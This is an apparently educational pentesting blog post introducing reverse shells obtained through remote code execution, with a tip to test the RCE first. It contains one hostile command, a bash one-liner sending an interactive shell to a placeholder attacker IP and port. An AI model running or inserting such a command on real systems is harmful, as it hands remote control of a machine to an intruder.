---
layout: post
title:  "Get reverse shell with RCE"
---

## Introduction

When we are triying to pwn a machine we look for a shell connected to the victim's machine. Sometimes we can found some credentiales or RSA keys to connect via SSH. More times we can't get a SSH shell but we have some [RCE][rce].
In this article we are going to cover different ways to get a reverse shell with [RCE][rce]



Soon in later articles we are going to be covering how to upgrade these shell's because these are not interactive, this means, for example, that if we press TAB we won't get an autocompletion, we will just get a tabulation. 

Also, a good practice before try to connect a reverse shell is try to test this RCE in order to don't confuse if the reverse shell got an error, beacuse we won't know if the problem is about the RCE or the shell.

For the porpous of this post we are going to be using an Ubuntu machine FocalFossa from [osboxes.org ][osboxes]

### Bash

This is propably the easiest way to do it.

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```





[osboxes]: https://www.osboxes.org/
[rce]: https://www.n-able.com/blog/remote-code-execution
